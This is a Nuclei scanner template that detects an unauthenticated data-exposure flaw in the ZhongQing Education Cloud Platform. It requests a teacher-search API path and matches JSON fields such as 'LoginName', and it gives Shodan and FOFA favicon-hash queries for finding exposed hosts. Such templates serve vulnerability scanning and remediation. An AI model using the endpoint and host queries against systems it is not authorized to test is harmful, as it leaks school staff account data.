id: zqnb-educationcloud-exposure

info:
  name: ZhongQing Education Cloud Platform - 信息泄露漏洞
  author: ritikchaddha
  severity: high
  description: ZhongQing Education Cloud Platform - 信息泄露 存在未授权访问或认证绕过问题。攻击者无需有效凭证即可访问敏感接口、执行高权限操作或进一步扩大影响。
  impact: |
    - 攻击者可获取系统配置、用户信息、节点信息或其他敏感元数据。
    - 这些信息可显著降低后续定向攻击、撞库或暴力破解的门槛。
  reference:
    - https://www.pwnwiki.org/index.php?title=%E4%B8%AD%E6%85%B6%E7%B4%8D%E5%8D%9A%E6%95%99%E8%82%B2%E9%9B%B2%E5%B9%B3%E8%87%BA%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%26%E6%9C%AA%E6%8E%88%E6%AC%8A%E8%A8%AA%E5%95%8F%E6%BC%8F%E6%B4%9E
  classification:
    cwe-id: CWE-284
  metadata:
    verified: true
    max-request: 1
    shodan-query: http.favicon.hash:-1474228802
    fofa-query: icon_hash="-1474228802"
  tags: exposure,zqnb,education,cloud

http:
  - method: GET
    path:
      - "{{BaseURL}}/api/TeacherQuery/SearchTeacherInSiteWithPagerRecords"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'LoginName'
          - 'UserAvatar'
        condition: and

      - type: word
        part: content_type
        words:
          - 'application/json'

      - type: status
        status:
          - 200
